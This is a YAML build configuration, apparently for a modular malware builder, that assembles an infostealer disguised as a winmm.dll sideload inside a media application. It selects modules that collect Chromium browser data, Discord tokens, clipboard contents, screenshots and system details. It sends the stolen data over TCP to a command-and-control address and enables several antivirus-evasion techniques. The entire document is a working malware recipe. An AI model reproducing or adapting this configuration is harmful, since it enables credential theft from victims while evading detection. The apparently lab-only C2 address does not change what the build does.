name: infostealer_sideload_winmm
description: Infostealer as winmm.dll sideload proxy — runs inside audio/media application

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/browser_chromium
  - collectors/discord_tokens
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/dll_sideload
def_file: winmm.def

api_resolve: api_resolve/api_hash_crc32

resources: true

evasion:
  - evasion/indirect_syscall
  - evasion/sleep_foliage
  - evasion/entropy_pad
  - evasion/iat_pad

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
